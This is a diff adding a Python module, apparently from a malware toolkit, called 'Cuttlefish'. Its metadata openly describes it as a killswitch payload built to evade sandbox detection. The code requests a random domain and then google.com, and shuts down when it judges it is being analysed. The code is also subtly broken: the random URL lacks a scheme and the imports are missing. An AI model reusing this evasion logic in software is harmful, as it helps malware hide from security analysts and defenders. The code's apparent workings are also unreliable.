@@ -1,0 +1,26 @@
+# --- METADATA ---
+# name: Cuttlefish
+# functionnality: killswitch
+# lang: Python
+# description: |
+#   Cuttlefish is a really good killswitch that aim to evade sandbox detection.
+#   I tries to connect to a random domain, if the connection is a HTTP200, then it means we're in a sandbox because they tend to make all request go 200 to analyse behavior, but seing this, the killswitch is set to True and nothing happen
+#   If the first condition is OK then it moves to the second which is a simple connection to google.com, it it does not work, then it means we're in an isolated environnement and it shut itself down to prevent analysis
+
+# --- PAYLOAD CODE ---
+def killswitch():
+    url = ''.join(random.choices(string.ascii_letters + string.digits, k=40)) + ".com"
+    try:
+        request_random = requests.get(url)
+        if request_random.status_code == 200:
+            return True
+    except requests.exceptions.RequestException:
+        pass
+    try:
+        request_google = requests.get("https://www.google.com")
+        if request_google.status_code == 200:
+            return False
+        else:
+            return True
+    except requests.exceptions.RequestException:
+        return True
